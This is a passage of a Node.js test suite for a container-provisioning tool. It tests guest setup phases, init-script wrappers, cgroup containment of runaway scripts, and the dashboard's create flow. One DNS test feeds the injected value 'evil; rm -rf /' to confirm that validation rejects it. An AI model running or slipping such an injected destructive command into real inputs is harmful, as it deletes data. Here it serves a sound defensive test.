  assert.equal(setupOutcome({ init_script: { state: 'uncertain', acknowledged: true } }).completion, 'partial', 'an acknowledged unknown init is a partial setup, not a new hold');
  assert.equal(setupOutcome({ network_nat: { state: 'skipped', contended: true } }).outcome, 'setup_partial', 'a contended NAT is not a completed setup');
  assert.equal(setupOutcome({ init_script: { state: 'failed', rc: 100, notRepeated: true } }).outcome, 'setup_partial', 'an init a retry did not repeat keeps its result: a failed init is still a failed setup');
  assert.equal(setupOutcome({ init_script: { state: 'done', notRepeated: true } }).outcome, 'setup_complete');
  assert.match(initWarning({ state: 'failed', rc: 100, log: '/var/log/pp-init-j.log', logBytes: 61 }), /exited with code 100; its output \(61 bytes\) is in \/var\/log\/pp-init-j\.log inside the container/);
  assert.match(initWarning({ state: 'failed', rc: 100, notRepeated: true, job: 'j' }), /not run again/);
  assert.match(initWarning({ state: 'timed_out', timeoutMs: 300000, job: 'j' }), /timed out after 5 minute\(s\) and was stopped — its output is in \/var\/log\/pp-init-j\.log/);
  assert.match(initWarning({ state: 'uncertain', job: 'j' }), /held until the job is acknowledged/);
  assert.equal(initWarning({ state: 'done' }), null);
  assert.equal(JSON.stringify(initWarning({ state: 'failed', rc: 1, detail: 'x' })).includes('tail'), false);
  // The create-status view from records alone.
  const create = (over = {}) => ({ id: 'c1', status: 'succeeded', created_at: new Date(T0 - 40_000).toISOString(), progress: { setup_job_id: 's1' }, ...over });
  const setup = (over = {}) => ({ id: 's1', status: 'running', phase: 'dns', progress: { phases: { network_nat: { state: 'done' } }, address: { ip: '10.10.10.7' } }, ...over });
  assert.equal(createStatusView({ create: null }), null);
  assert.deepEqual(createStatusView({ create: create({ status: 'queued', progress: {} }), nowMs: T0 }).phase, 'downloading');
  assert.equal(createStatusView({ create: create({ status: 'running', phase: 'issuing', progress: {} }), nowMs: T0 }).message, 'Downloading the image and launching…');
  const failed = createStatusView({ create: create({ status: 'failed', reason: 'incus launch exited 1: image not found', progress: {} }), nowMs: T0 });
  assert.equal(failed.phase, 'failed'); assert.match(failed.error, /image not found/); assert.equal(failed.elapsed, 40);
  assert.equal(createStatusView({ create: create({ progress: {} }), nowMs: T0 }).phase, 'ready', 'a create without a setup is ready when it succeeded');
  assert.equal(createStatusView({ create: create(), setup: null, nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ status: 'queued' }), nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'network_nat' }), nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'await_address' }), nowMs: T0 }).phase, 'network');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'dns' }), nowMs: T0 }).phase, 'network');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'init_script' }), nowMs: T0 }).phase, 'init-script');
  const pendingRoutes = setup({ status: 'succeeded', phase: 'finished', progress: { phases: { network_nat: { state: 'done' }, routes: { state: 'pending' } }, address: { ip: '10.10.10.7' }, routes_job_id: 'r1', completion: 'pending' } });
  const caddy = createStatusView({ create: create(), setup: pendingRoutes, routes: { id: 'r1', status: 'queued' }, nowMs: T0 });
  assert.equal(caddy.phase, 'caddy'); assert.equal(caddy.completion, 'pending');
  const doneRoutes = setup({ status: 'succeeded', phase: 'finished', progress: { phases: { network_nat: { state: 'done' }, init_script: { state: 'failed', rc: 2, log: '/var/log/pp-init-s1.log', logBytes: 9 }, routes: { state: 'done', conflicts: [{ domain: 'api.example.test' }] } }, address: { ip: '10.10.10.7' } } });
  const ready = createStatusView({ create: create(), setup: doneRoutes, nowMs: T0 });
  assert.equal(ready.phase, 'ready'); assert.equal(ready.ip, '10.10.10.7'); assert.equal(ready.completion, 'partial'); assert.match(ready.initScriptWarning, /exited with code 2; its output \(9 bytes\) is in \/var\/log\/pp-init-s1\.log/); assert.match(ready.caddyWarning, /api.example.test already routed elsewhere/); assert.equal(ready.setupJobId, 's1');
  assert.equal(JSON.stringify(ready).includes('E: nope'), false);
  const complete = createStatusView({ create: create(), setup: setup({ status: 'succeeded', phase: 'finished', progress: { phases: { network_nat: { state: 'done' }, routes: { state: 'done' } }, completion: 'complete', address: { ip: '10.10.10.7' } } }), nowMs: T0 });
  assert.equal(complete.completion, 'complete'); assert.equal(complete.message, 'Container is ready');
  // A routes job that died without annotating: read from its own row.
  const orphan = createStatusView({ create: create(), setup: pendingRoutes, routes: { id: 'r1', status: 'failed', reason: 'interrupted' }, nowMs: T0 });
  assert.equal(orphan.phase, 'ready'); assert.equal(orphan.completion, 'partial'); assert.match(orphan.caddyWarning, /Routes failed: interrupted/);
  const partial = createStatusView({ create: create(), setup: setup({ status: 'failed', reason: 'pp-n: await_address: failed (no address)', phase: 'finished', progress: { phases: { await_address: { state: 'failed', detail: 'no address' }, routes: { state: 'skipped', detail: 'no host-reachable address was found' } } } }), nowMs: T0 });
  assert.equal(partial.phase, 'ready', 'the guest is usable'); assert.equal(partial.completion, 'partial'); assert.match(partial.caddyWarning, /Routes not configured: no host-reachable address/);
  const held = createStatusView({ create: create(), setup: setup({ status: 'recovery_required', outcome: 'init_uncertain', phase: 'finished', progress: { phases: { init_script: { state: 'uncertain', job: 's1' } }, completion: 'uncertain' } }), nowMs: T0 });
  assert.equal(held.completion, 'uncertain'); assert.match(held.message, /held until the setup job is acknowledged/);
});

// ── 2. the guest scripts under a real sh ──────────────────────────────────

const sh = (script, { timeoutMs = 10_000 } = {}) => spawnSync('sh', ['-s'], { input: script, encoding: 'utf8', timeout: timeoutMs });

test('dnsScript under sh: writes the resolvers when the marker is absent (replacing a symlink), leaves the file alone when present, reports a write failure', () => {
  const dir = tmp();
  const target = join(dir, 'resolv.conf');
  writeFileSync(join(dir, 'stub-resolv.conf'), 'nameserver 127.0.0.53\n');
  symlinkSync(join(dir, 'stub-resolv.conf'), target);
  let r = sh(dnsScript({ resolvPath: target }));
  assert.equal(r.status, 0, r.stderr); assert.equal(parseDns(r.stdout), 'written');
  assert.equal(readFileSync(target, 'utf8'), 'nameserver 9.9.9.9\nnameserver 1.1.1.1\n');
  assert.equal(statSync(target).isSymbolicLink?.() || false, false, 'the symlink was replaced by a file');
  assert.equal(readFileSync(join(dir, 'stub-resolv.conf'), 'utf8'), 'nameserver 127.0.0.53\n', 'the symlink target was not written through');
  r = sh(dnsScript({ resolvPath: target }));
  assert.equal(parseDns(r.stdout), 'unchanged');
  r = sh(dnsScript({ resolvers: ['1.0.0.1'], resolvPath: join(dir, 'no-such-dir', 'resolv.conf') }));
  assert.equal(r.status, 1); assert.equal(parseDns(r.stdout), 'failed');
  assert.throws(() => dnsScript({ resolvers: ['evil; rm -rf /'] }), /IPv4/);
  assert.throws(() => dnsScript({ resolvPath: 'relative' }), /absolute/);
  rmSync(dir, { recursive: true, force: true });
});

const shUmask022 = (script, { timeoutMs = 10_000 } = {}) => spawnSync('sh', ['-c', 'umask 022; exec sh -s'], { input: script, encoding: 'utf8', timeout: timeoutMs });

test('initScriptWrapper under sh (umask 022): the script runs from base64; its exit code and output are recorded in the guest as 0600 files; the wrapper prints markers only — a credential the script echoes stays in the log; the read-back finds the exit; the temp script is gone', () => {
  const dir = tmp();
  const b64 = Buffer.from(ECHO_SCRIPT, 'utf8').toString('base64');
  const r = shUmask022(initScriptWrapper({ jobId: 'job-1', b64, logDir: dir, tmpDir: dir }));
  assert.equal(r.status, 0, r.stderr);
  const res = parseInitResult(r.stdout);
  assert.equal(res.rc, 5); assert.equal(res.recorded, true); assert.equal(res.log, join(dir, 'pp-init-job-1.log')); assert.ok(res.logBytes > 20);
  assert.equal(r.stdout.includes(CRED), false, 'the wrapper never prints the script\'s output'); assert.equal(r.stderr.includes(CRED), false);
  assert.equal(r.stdout.trim().split('\n').every((l) => /^PP_INIT_(RC|LOG|LOG_BYTES):/.test(l)), true, `markers only: ${r.stdout}`);
  assert.equal(readFileSync(join(dir, 'pp-init-job-1.rc'), 'utf8').trim(), '5');
  const log = readFileSync(join(dir, 'pp-init-job-1.log'), 'utf8');
  assert.match(log, /installing/); assert.ok(log.includes(CRED), 'stdout and stderr both land in the log'); assert.ok(log.includes(`${CRED}-pw`));
  assert.equal(statSync(join(dir, 'pp-init-job-1.log')).mode & 0o777, 0o600, 'the log is owner-only under umask 022');
  assert.equal(statSync(join(dir, 'pp-init-job-1.rc')).mode & 0o777, 0o600);
  assert.equal(existsSync(join(dir, 'pp-init-job-1.sh')), false, 'the materialised script is removed');
  assert.equal(existsSync(join(dir, 'pp-init-job-1.pid')), false);
  const read = shUmask022(initResultReadScript({ jobId: 'job-1', logDir: dir, tmpDir: dir }));
  const back = parseInitResult(read.stdout);
  assert.equal(back.rc, 5, 'a resumed job reads the recorded exit'); assert.equal(back.log, join(dir, 'pp-init-job-1.log')); assert.equal(read.stdout.includes(CRED), false, 'the read-back never prints the log');
  const none = shUmask022(initResultReadScript({ jobId: 'job-2', logDir: dir, tmpDir: dir }));
  assert.deepEqual([parseInitResult(none.stdout).rc, parseInitResult(none.stdout).recorded, parseInitResult(none.stdout).noPid], [null, true, true]);
  assert.throws(() => initScriptWrapper({ jobId: 'job 1', b64 }), /plain identifier/);
  assert.throws(() => initScriptWrapper({ jobId: 'job-1', b64: 'not base64!' }), /base64/);
  rmSync(dir, { recursive: true, force: true });
});

test('a timed-out init under sh with NO containment record: the client is killed, the script keeps running in its own session, the read-back finds no exit code; the kill script kills the recorded session best-effort but reports norecord — a session-group kill establishes nothing about a setsid descendant', async (t) => {
  const dir = tmp(); const runDir = join(dir, 'run');
  const out = join(dir, 'writer.out');
  // The script starts a writer in a NEW session (as a daemonising installer
  // does) and then blocks; the writer outlives everything the pid names.
  const body = `#!/bin/sh\necho started\nsetsid sh -c 'echo $$ > ${dir}/writer.pid; while :; do date >> ${out}; sleep 0.1; done' > /dev/null 2>&1 < /dev/null &\nsleep 30\n`;
  const b64 = Buffer.from(body, 'utf8').toString('base64');
  const child = spawn('sh', ['-c', 'umask 022; exec sh -s'], { stdio: ['pipe', 'pipe', 'pipe'] });
  child.stdin.end(initScriptWrapper({ jobId: 'job-t', b64, logDir: dir, tmpDir: dir }));
  await new Promise((r) => setTimeout(r, 900));
  const pidFile = join(dir, 'pp-init-job-t.pid');
  assert.ok(existsSync(pidFile), 'the wrapper recorded the script pid'); assert.ok(existsSync(join(dir, 'writer.pid')), 'the descendant started');
  for (const f of ['pp-init-job-t.log', 'pp-init-job-t.pid']) assert.equal(statSync(join(dir, f)).mode & 0o777, 0o600, `${f} is owner-only while the script runs (umask 022 in the guest)`);
  assert.equal(statSync(join(dir, 'pp-init-job-t.sh')).mode & 0o777, 0o700, 'the materialised script is owner-only');
  const pid = Number(readFileSync(pidFile, 'utf8').trim()); const writer = Number(readFileSync(join(dir, 'writer.pid'), 'utf8').trim());
  t.after(() => { for (const p of [writer, pid]) { try { process.kill(-p, 'SIGKILL'); } catch { /* gone */ } try { process.kill(p, 'SIGKILL'); } catch { /* gone */ } } rmSync(dir, { recursive: true, force: true }); });
  child.kill('SIGKILL'); // the executor's timeout: the exec client dies
  await new Promise((r) => setTimeout(r, 200));
  assert.equal(alive(pid), true, 'the init script outlives its client (its own session)'); assert.equal(alive(writer), true);
  const read = sh(initResultReadScript({ jobId: 'job-t', logDir: dir, tmpDir: dir }));
  const res = parseInitResult(read.stdout);
  assert.equal(res.rc, null); assert.equal(res.running, pid, 'the read-back reports it running, records nothing as done');
  const kill = sh(initKillScript({ jobId: 'job-t', runDir, logDir: dir, tmpDir: dir }), { timeoutMs: 15_000 });
  assert.deepEqual(parseInitKillReport(kill.stdout), { verdict: 'norecord', survivors: null, groups: 0 }, kill.stdout + kill.stderr);
  await new Promise((r) => setTimeout(r, 300));
  assert.equal(alive(pid), false, 'the recorded session is killed on the way out');
  assert.equal(alive(writer), true, 'the setsid descendant is NOT in that session: it survives — exactly why a pid-based "gone" was never evidence');
  const size = statSync(out).size; await new Promise((r) => setTimeout(r, 400)); assert.ok(statSync(out).size > size, 'it is still writing');
  assert.equal(existsSync(join(dir, 'pp-init-job-t.rc')), false, 'nothing claims an exit code');
  assert.equal(kill.stdout.trim().split('\n').every((l) => /^PP_INIT_(KILL|GROUPS):/.test(l)), true, `markers only: ${kill.stdout}`);
});
// Alive means running, not a zombie: this sandbox's pid 1 reaps nothing, and kill(pid, 0) answers yes for a corpse.
function alive(pid) { try { const st = readFileSync(`/proc/${pid}/stat`, 'utf8').replace(/^[^)]*\) /, '').split(' ')[0]; return !!st && st !== 'Z' && st !== 'X'; } catch { return false; } }


// Real containment over the DEFAULT roots and run dir the production wrapper
// uses (cgroup2, cgroup1 pids, or systemd), plus the guest paths the init
// artifacts land in — probed like the closeout suite does, with a throwaway
// job so nothing of the probe remains.
function realContainmentKind() {
  try { for (const p of ['/var/log', '/tmp', '/run']) accessSync(p, FS.W_OK); } catch { return null; }
  const runDir = join(tmp(), 'run');
  const r = spawnSync('sh', ['-s'], { input: containedScript('pp-setup-probe', 'echo probe-ok', { runDir }), encoding: 'utf8', timeout: 10_000 });
  const c = parseContainment(r.stderr);
  if (c?.ref && c.kind !== 'systemd') { try { rmdirSync(c.ref); } catch { /* left for the reaper */ } }
  return c && c.kind !== 'none' && /probe-ok/.test(r.stdout || '') ? c.kind : null;
}
const sleepReal = (ms) => new Promise((r) => setTimeout(r, ms));
const procsIn = (g) => { try { return readFileSync(`${g}/cgroup.procs`, 'utf8').split('\n').map((x) => Number(x)).filter(Boolean); } catch { return []; } };
const recordedGroups = (id) => { const f = `${CONTAINMENT_RUN_DIR}/${id}.cgroups`; return existsSync(f) ? readFileSync(f, 'utf8').split('\n').filter(Boolean) : []; };
const recordedUnits = (id) => { const f = `${CONTAINMENT_RUN_DIR}/${id}.units`; return existsSync(f) ? readFileSync(f, 'utf8').split('\n').filter(Boolean) : []; };

test('REAL PROCESSES through the store and the executor: an init script whose setsid descendant keeps writing after its recorded parent is gone — the timeout kill stops the WHOLE containment group, issued outside it, and only then records timed_out with no hold; with the containment record missing the kill is inconclusive, the guest is HELD, conflicting work is refused, and only the writer-stopped acknowledgement releases it', async (t) => {
  const kind = realContainmentKind();
  if (!kind) { t.skip('no real containment mechanism here (no writable cgroup tree or systemd), or /var/log, /tmp, /run not writable'); return; }
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const work = tmp(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st);
  const jobs = []; const writers = []; const seen = {};
  t.after(async () => {
    for (const w of writers) { try { process.kill(w, 'SIGKILL'); } catch { /* gone */ } }
    for (const id of jobs) {
      for (const root of ['/sys/fs/cgroup', '/sys/fs/cgroup/unified', '/sys/fs/cgroup/pids']) { const g = `${root}/mock2-deploy/${id}`; if (existsSync(g)) { for (const p of procsIn(g)) { try { process.kill(p, 'SIGKILL'); } catch { /* gone */ } } await sleepReal(100); try { rmdirSync(g); } catch { /* still populated: reported below */ } } }
      for (const u of recordedUnits(id)) spawnSync('systemctl', ['kill', '--signal=KILL', '--kill-whom=all', u]);
      for (const f of [`/var/log/pp-init-${id}.log`, `/var/log/pp-init-${id}.rc`, `/var/log/pp-init-${id}.pid`, `/tmp/pp-init-${id}.sh`]) rmSync(f, { force: true });
      try { for (const f of readdirSync(CONTAINMENT_RUN_DIR)) if (f.startsWith(`${id}.`)) rmSync(join(CONTAINMENT_RUN_DIR, f), { force: true }); } catch { /* no run dir */ }
    }
    rmSync(work, { recursive: true, force: true });
  });
  // The script daemonises a writer into a NEW session (as an installer that
  // forks a service does) and then blocks: the recorded pid names the
  // blocked leader, never the writer.
  const writerScript = (tag) => `#!/bin/sh\necho init-output-7f3a\nsetsid sh -c 'echo $$ > ${work}/${tag}.pid; while :; do date >> ${work}/${tag}.out; sleep 0.1; done' > /dev/null 2>&1 < /dev/null &\nsleep 60\n`;
  const grows = async (file, ms = 500) => { const a = statSync(file).size; await sleepReal(ms); return statSync(file).size > a; };
  const waitFor = async (file) => { for (let i = 0; i < 40 && !existsSync(file); i += 1) await sleepReal(50); return existsSync(file); };
  const captureWriter = async (id, tag) => { assert.ok(await waitFor(`${work}/${tag}.pid`), 'the descendant started'); const writer = Number(readFileSync(`${work}/${tag}.pid`, 'utf8').trim()); writers.push(writer); const groups = recordedGroups(id); const units = recordedUnits(id); assert.ok(groups.length + units.length >= 1, `the init attempt recorded its containment (${kind}) under ${CONTAINMENT_RUN_DIR}`); return { writer, groups, units }; };

  // 1) Conclusive: the recorded parent dies, its setsid descendant does not.
  const gs = { realContained: true, beforeKill: async (id) => {
    const parent = Number(readFileSync(`/var/log/pp-init-${id}.pid`, 'utf8').trim());
    seen.w1 = await captureWriter(id, 'w1');
    assert.equal(alive(parent), true, 'the leader outlived the timed-out client'); process.kill(parent, 'SIGKILL'); await sleepReal(300);
    assert.equal(alive(parent), false, 'the recorded pid is gone…'); assert.equal(alive(seen.w1.writer), true, '…and the setsid descendant is not');
    assert.equal(await grows(`${work}/w1.out`), true, 'it keeps writing after its parent exited');
    if (seen.w1.groups.length) assert.ok(seen.w1.groups.some((g) => procsIn(g).includes(seen.w1.writer)), 'the descendant left the session, never the job\'s cgroup');
  } };
  const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, writerScript('w1'));
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script, initTimeoutMs: 1000 }, nowMs: T0 });
  assert.ok(sub.job, sub.error); jobs.push(sub.job.id);
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  if (gs.hookError) throw gs.hookError;
  assert.equal(out.ran[0].status, 'failed', getJob(d, sub.job.id).reason);
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'timed_out'); assert.equal(ph.init_script.killed, 'gone'); assert.equal(ph.init_script.survivors, 0); assert.ok(ph.init_script.groups >= 1, `groups recorded: ${ph.init_script.groups}`);
  assert.deepEqual(ph.init_script.writer, { state: 'stopped', pid: null }); assert.match(ph.init_script.detail, /ran longer than 1 s and was stopped — its containment group \(\d+ recorded\) is empty/);
  assert.equal(alive(seen.w1.writer), false, 'the group kill stopped the descendant the pid never named');
  assert.equal(await grows(`${work}/w1.out`), false, 'nothing writes any more');
  for (const grp of seen.w1.groups) assert.equal(existsSync(grp), false, `the emptied cgroup is removed: ${grp}`);
  assert.equal(existsSync(`${CONTAINMENT_RUN_DIR}/${sub.job.id}.cgroups`), false, 'the record is removed once every group is empty'); assert.equal(existsSync(`${CONTAINMENT_RUN_DIR}/${sub.job.id}.units`), false);
  assert.equal(existsSync(`/tmp/pp-init-${sub.job.id}.sh`), false); assert.equal(existsSync(`/var/log/pp-init-${sub.job.id}.pid`), false); assert.equal(existsSync(`/var/log/pp-init-${sub.job.id}.rc`), false, 'nothing claims an exit code');
  assert.equal(statSync(`/var/log/pp-init-${sub.job.id}.log`).mode & 0o777, 0o600, 'the log stays, owner-only'); assert.ok(readFileSync(`/var/log/pp-init-${sub.job.id}.log`, 'utf8').includes('init-output-7f3a'), 'the script\'s output is in the guest\'s log');
  assert.equal(g.calls.find((x) => x.phase === 'init').contained, true, 'the init ran inside the containment wrapper'); assert.equal(g.calls.find((x) => x.phase === 'init_kill').contained, false, 'the kill was issued OUTSIDE it');
  assert.equal(readLock(d, 'pp-n'), null, 'every group empty: no hold'); assert.equal(gs.killed, 1);
  noScriptIn(d, [sub.job.id]); assert.equal((JSON.stringify(getJob(d, sub.job.id)) + JSON.stringify(listEvents(d, sub.job.id))).includes('init-output-7f3a'), false, 'no output in the record');
  assert.equal(submitRunnerJob(d, { kind: 'instance_delete', app: 'pp-n', params: { container: 'pp-n', force: true }, nowMs: c.nowMs() }).job != null, true, 'conflicting work is accepted once the writers are conclusively stopped');
  d.prepare(`DELETE FROM setup_jobs WHERE kind = 'instance_delete'`).run();

  // 2) Inconclusive: the containment record is gone before the kill (a
  // rebooted /run, a reaper that ran between). The pid-only kill of the
  // leader is best effort and proves nothing; the descendant keeps writing.
  const gs2 = { realContained: true, beforeKill: async (id) => { seen.w2 = await captureWriter(id, 'w2'); for (const f of [`${CONTAINMENT_RUN_DIR}/${id}.cgroups`, `${CONTAINMENT_RUN_DIR}/${id}.units`]) rmSync(f, { force: true }); } };
  const g2 = scriptedGuest(gs2);
  const script2 = writeInitScriptInput(inputsDir, writerScript('w2'));
  const sub2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script2, initTimeoutMs: 1000 }, nowMs: c.nowMs() });
  assert.ok(sub2.job, sub2.error); jobs.push(sub2.job.id);
  const out2 = await runAll(d, exec(h, g2), c, { inputsDir });
  if (gs2.hookError) throw gs2.hookError;
  assert.equal(out2.ran[0].status, 'recovery_required'); assert.equal(out2.ran[0].outcome, 'init_uncertain');
  const ph2 = phasesOf(d, sub2.job.id);
  assert.equal(ph2.init_script.state, 'uncertain'); assert.equal(ph2.init_script.killed, 'norecord'); assert.equal(ph2.init_script.groups, 0); assert.deepEqual(ph2.init_script.writer, { state: 'unknown', pid: null });
  assert.match(ph2.init_script.detail, /containment record is missing, so the writer group could not be inspected/); assert.match(ph2.init_script.detail, /guest is held until the job is acknowledged/);
  assert.equal(alive(seen.w2.writer), true, 'the descendant survived the pid-only best effort'); assert.equal(await grows(`${work}/w2.out`), true, 'and is still writing — the hold is what protects the guest');
  holdOn(d, 'pp-n', sub2.job.id);
  const del = submitRunnerJob(d, { kind: 'instance_delete', app: 'pp-n', params: { container: 'pp-n', force: true }, nowMs: c.nowMs() });
  assert.ok(['CONTAINER_BUSY', 'CONTAINER_LOCK_STALE'].includes(del.code), `a delete is refused while the writer is unknown: ${JSON.stringify(del)}`);
  assert.ok(['CONTAINER_BUSY', 'CONTAINER_LOCK_STALE'].includes(submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'], expect: { uuid: UUID_B } }, nowMs: c.nowMs() }).code), 'so is another setup');
  assert.equal(st.instances.length, 1, 'nothing touched the guest');
  const noAttest = acknowledgeUncertainJob(d, { id: sub2.job.id, by: 'thomas', nowMs: c.nowMs() });
  assert.equal(noAttest.code, 'WRITER_NOT_ESTABLISHED'); holdOn(d, 'pp-n', sub2.job.id);
  // The operator stops the group by hand (the cgroup the attempt was in) and attests to it.
  for (const grp of seen.w2.groups) { for (const p of procsIn(grp)) { try { process.kill(p, 'SIGKILL'); } catch { /* gone */ } } }
  try { process.kill(seen.w2.writer, 'SIGKILL'); } catch { /* gone */ }
  await sleepReal(300); assert.equal(alive(seen.w2.writer), false);
  for (const grp of seen.w2.groups) { try { rmdirSync(grp); } catch { /* a corpse nobody reaped; the after-hook retries */ } }
  const ack = acknowledgeUncertainJob(d, { id: sub2.job.id, by: 'thomas', writerStopped: true, note: `killed cgroup ${seen.w2.groups[0] || seen.w2.units[0] || '?'} by hand; nothing writes`, nowMs: c.nowMs() });
  assert.equal(ack.ok, true, JSON.stringify(ack)); assert.equal(readLock(d, 'pp-n'), null); assert.equal(getJob(d, sub2.job.id).outcome, 'init_uncertain_acknowledged');
  assert.ok(submitRunnerJob(d, { kind: 'instance_delete', app: 'pp-n', params: { container: 'pp-n', force: true }, nowMs: c.nowMs() }).job, 'the acknowledged hold no longer refuses the delete');
  noScriptIn(d, [sub2.job.id]);
});

// ── 3. the input store ────────────────────────────────────────────────────

test('setup inputs: a 0600 file next to the database, written once by reference, read and verified by digest, consumed once, swept when nobody consumed it', () => {
  const dir = setupInputsDir('/opt/pp/data/db/proxypilot.db');
  assert.equal(dir, '/opt/pp/data/db/setup-inputs');
  const base = tmp(); const d = join(base, 'setup-inputs');
  const w = writeInitScriptInput(d, SCRIPT, { ref: 'ref-1' });
  assert.deepEqual(w, { ref: 'ref-1', sha256: sha256Of(SCRIPT), bytes: Buffer.byteLength(SCRIPT) });
  assert.equal(statSync(join(d, 'ref-1.init.sh')).mode & 0o777, 0o600); assert.equal(statSync(d).mode & 0o777, 0o700);
  assert.throws(() => writeInitScriptInput(d, 'x', { ref: 'ref-1' }), /EEXIST/, 'a reference is used once');
  assert.throws(() => writeInitScriptInput(d, '', { ref: 'ref-2' }), /empty/);
  assert.throws(() => writeInitScriptInput(d, 'x', { ref: '../etc/passwd' }), /plain identifier/);
  assert.deepEqual(readInitScriptInput(d, 'ref-1'), { content: SCRIPT, sha256: w.sha256, bytes: w.bytes });
  assert.equal(readInitScriptInput(d, 'ref-none'), null);
  assert.equal(consumeInitScriptInput(d, 'ref-1'), true); assert.equal(consumeInitScriptInput(d, 'ref-1'), false); assert.equal(readInitScriptInput(d, 'ref-1'), null);
  writeInitScriptInput(d, 'a', { ref: 'old' }); writeInitScriptInput(d, 'b', { ref: 'new' });
  const past = new Date(Date.now() - 2 * 24 * 3600 * 1000); utimesSync(join(d, 'old.init.sh'), past, past);
  assert.deepEqual(sweepSetupInputs(d), ['old']); assert.equal(readInitScriptInput(d, 'new').content, 'b');
  assert.deepEqual(sweepSetupInputs(join(base, 'absent')), []);
  rmSync(base, { recursive: true, force: true });
});

// ── 4. the dashboard's create, end to end ─────────────────────────────────

test('dashboard create: the launch job carries the plan; its executor queues the guest setup BOUND to the launched guest; every phase runs and is recorded on the one setup record; the script reaches the guest and never a row; the routes step lands on the record; create-status reads it all', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs');
  const st = { instances: [] }; const h = scriptedHost(st); const gs = { initRc: 0 }; const g = scriptedGuest(gs);
  const { asked } = opsStore(d, h, g, { inputsDir });
  t.after(() => configureContainerLockStore(null));
  const { out, setup } = await dashboardCreate(d, h, g, { inputsDir });
  assert.equal(out.ok, true, JSON.stringify(out)); assert.equal(out.submitted, true);
  const create = getJob(d, out.jobId);
  assert.equal(create.status, 'succeeded'); assert.equal(create.kind, 'instance_create');
  assert.equal(st.launches, 1);
  const cprog = parseJson(create.progress_json);
  assert.ok(cprog.setup_job_id, 'the create names the setup it queued');
  const setupJob = getJob(d, cprog.setup_job_id);
  assert.equal(setupJob.kind, 'guest_setup'); assert.equal(setupJob.status, 'succeeded', setupJob.reason);
  assert.equal(setupJob.outcome, 'setup_pending', 'the routes are with another job: the setup is not complete yet'); assert.equal(parseJson(setupJob.progress_json).completion, 'pending');
  assert.equal(setupJob.requested_by, 'thomas', 'the operator who asked for the create owns the setup too');
  const sp = parseJson(setupJob.plan_json).params;
  assert.deepEqual(sp.expect, { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z' }, 'bound to the guest the launch read back, not to the request');
  assert.deepEqual(sp.phases, ['network_nat', 'await_address', 'dns', 'init_script', 'routes']);
  assert.deepEqual(sp.initScript, setup.initScript); assert.deepEqual(sp.origin, { jobId: create.id, kind: 'instance_create' });
  const ph = phasesOf(d, setupJob.id);
  assert.equal(ph.network_nat.state, 'done'); assert.equal(ph.network_nat.ipForward, true); assert.deepEqual(ph.network_nat.bridges.map((b) => b.name), ['incusbr0']); assert.equal(ph.network_nat.masquerade, 'added');
  assert.deepEqual(ph.await_address, { ...ph.await_address, state: 'done', ip: '10.10.10.7', interface: 'eth0' });
  assert.equal(ph.dns.state, 'done'); assert.equal(ph.dns.result, 'written');
  assert.equal(ph.init_script.state, 'done'); assert.equal(ph.init_script.rc, 0); assert.equal(ph.init_script.script.sha256, setup.initScript.sha256);
  assert.equal(ph.routes.state, 'pending'); assert.ok(ph.routes.job, 'the routes step is queued and named on the setup record');
  assert.deepEqual(gs.initScripts, [SCRIPT], 'the exact script reached the guest, once');
  assert.equal(readInitScriptInput(inputsDir, setup.initScript.ref), null, 'the input was consumed');
  noScriptIn(d, [create.id, setupJob.id]);
  // The fixed host commands, in order, and nothing shell-shaped.
  const m = mutations(h).map((a) => a.join(' '));
  assert.ok(m.includes('sysctl -w net.ipv4.ip_forward=1')); assert.ok(m.includes('incus network set incusbr0 ipv4.nat true'));
  assert.ok(m.includes('iptables -I DOCKER-USER -i incusbr0 -j ACCEPT') && m.includes('iptables -I DOCKER-USER -o incusbr0 -j ACCEPT'));
  assert.ok(m.some((x) => x.startsWith('iptables -t nat -A POSTROUTING')));
  assert.ok(!h.calls.some((a) => a.includes('sh') || a.includes('-c')), 'no shell on the host channel');
  assert.equal(h.calls.some((a) => a[1] === 'exec'), false, 'the guest scripts go through the contained guest executor, not incus exec on the host channel');
  const routesJob = getJob(d, ph.routes.job);
  assert.equal(routesJob.kind, 'configure_routes'); assert.equal(routesJob.status, 'queued', 'queued for the backend; nothing ran it yet');
  assert.deepEqual(parseJson(routesJob.plan_json).params.services, SERVICES); assert.equal(parseJson(routesJob.plan_json).params.ip, '10.10.10.7'); assert.equal(parseJson(routesJob.plan_json).params.serviceName, 'new');
  // The create-status answer while the routes are with the backend (the poll
  // kicks the backend's drain so the dashboard never waits for the interval), then ready.
  let view = createStatus(d, 'pp-new', { nowMs: T0 });
  assert.equal(view.phase, 'caddy'); assert.equal(view.ip, '10.10.10.7'); assert.equal(view.jobId, create.id); assert.equal(view.setupJobId, setupJob.id);
  assert.equal(getJob(d, routesJob.id).status, 'running', 'the poll kicked the drain');
  const ran = await drainBackendStepsNow();
  assert.equal(ran.ran.length, 1); assert.equal(ran.ran[0].status, 'succeeded'); assert.equal(ran.ran[0].outcome, 'routes_configured');
  assert.deepEqual(asked.map(({ fence, ...r }) => r), [{ container: 'pp-new', name: 'new', ip: '10.10.10.7', services: SERVICES }]); assert.equal(typeof asked[0].fence, 'function', 'the configurator is handed the lease fence');
  assert.equal(phasesOf(d, setupJob.id).routes.state, 'done', 'the routes outcome landed on the setup record'); assert.deepEqual(phasesOf(d, setupJob.id).routes.created, SERVICES.map((s) => s.domain));
